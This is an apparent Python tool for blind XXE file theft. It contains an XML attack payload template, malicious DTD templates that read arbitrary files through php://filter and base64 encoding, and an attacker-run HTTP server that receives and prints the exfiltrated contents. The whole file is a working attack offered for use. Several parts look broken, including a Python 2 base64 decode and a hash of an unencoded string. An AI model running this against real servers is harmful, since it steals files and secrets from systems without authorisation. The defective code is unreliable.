#!/usr/bin/env python3
import base64
import logging
from http.server import BaseHTTPRequestHandler,HTTPServer
from hashlib import sha1
import sys, os
import urllib.request, urllib.parse, urllib.error

"""
We take the approach of a XXE attack with variable dtd, with a variable dtd response
"""

# FYI
ATTACK_TEMPLATE = """
<!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://{dtd_url}/{b64_encoded_filename}.dtd'>%remote;%init;%trick;]>
"""

DTD_TEMPLATE_Z = """
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource={filename}">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM '{exfil_url}/?p=%file;'>" >
"""

DTD_TEMPLATE = """
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={filename}">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM '{exfil_url}/?p=%file;'>" >
"""

LAST_CONTENTS = ''


def makeCustomHandlerClass(dtd_url, isb64):
    """class factory method for injecting custom args into handler class.
    see here for more info: http://stackoverflow.com/questions/21631799/how-can-i-pass-parameters-to-a-requesthandler"""
    class xxeHandler(BaseHTTPRequestHandler, object):
        def __init__(self, *args, **kwargs):
            self.exfil_url = dtd_url
            self.isb64 = isb64
            super(xxeHandler, self).__init__(*args, **kwargs)

        def log_message(self, format, *args):
            """overwriting this method to silence stderr output"""
            return

        def _make_dtd(self, filename, exfil_url):
            return DTD_TEMPLATE.format(filename=filename, exfil_url=exfil_url).encode()

        def _serve_dtd(self):
            mimetype = 'application/xml-dtd'

            # get the target filename from the dtd filename
            filename_b64 = self.path.split('/')[-1].split('.dtd')[0]
            try:
                filename = base64.b64decode(filename_b64).decode()
                logging.info(f"Received DTD query for {filename}")
            except Exception as e:
                logging.exception(f"Could not decode filename from b64 value for dtd name {filename_b64}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b"")
                return

            dtd_content = self._make_dtd(filename, self.exfil_url)
            self.send_response(200)
            self.send_header('Content-type', mimetype)
            self.end_headers()
            self.wfile.write(dtd_content)
            return

        def do_GET(self):
            if self.path == '/_ping':
                # server check
                self.send_response(200)
                self.wfile.write(b"pong")

            elif self.path.endswith('.dtd'):
                # need to actually serve DTD here
                self._serve_dtd()
            else:
                # assume it is file contents and spit it out
                self._decode_file_content()

            return

        def _decode_file_content(self):
            # assume it is file contents and spit it out
            if self.path[0:2] == '/?':  # hacky way to get rid of beginning chars
                contents = self.path[2:]
            else:
                contents = self.path
            displayContents(contents, self.isb64)
            self.send_response(200)
            self.end_headers()
            # respond with something so it doesn't time out
            self.wfile.write(b"")

    return xxeHandler
    

def displayContents(contents, isBase64=False):
    """my hacky way to not display duplicate contents. 
    for some reason xml sends back to back requests
    and i only want to show the first one"""
    global LAST_CONTENTS
    newContents = sha1(contents).hexdigest()
    if LAST_CONTENTS != newContents:
        print("[+] Received response, displaying\n")
        if not isBase64:
            print(urllib.parse.unquote(contents))
        else:
            print(urllib.parse.unquote(contents).encode().decode('base64'))
        LAST_CONTENTS = newContents
        print("------\n")
    return
    
  
def startServer(ip, port=8000, isb64=False):
    try:
        dtd_url = f'http://{ip}:{port}'
        xxeHandler = makeCustomHandlerClass(dtd_url, isb64)
        server = HTTPServer((str(ip), port), xxeHandler)
        print(('\n[+] started server on {}:{}'.format(ip,port)))
        print('\n[+] Request away. Happy hunting.')
        print('[+] press Ctrl-C to close\n')
        server.serve_forever()

    except KeyboardInterrupt:
        print("\n...shutting down")
        if os.path.exists('.server_started'):
            os.remove('.server_started')
        server.socket.close()
        
def usage():
    print(("Usage: {} <ip> <port>".format(sys.argv[0])))

        
    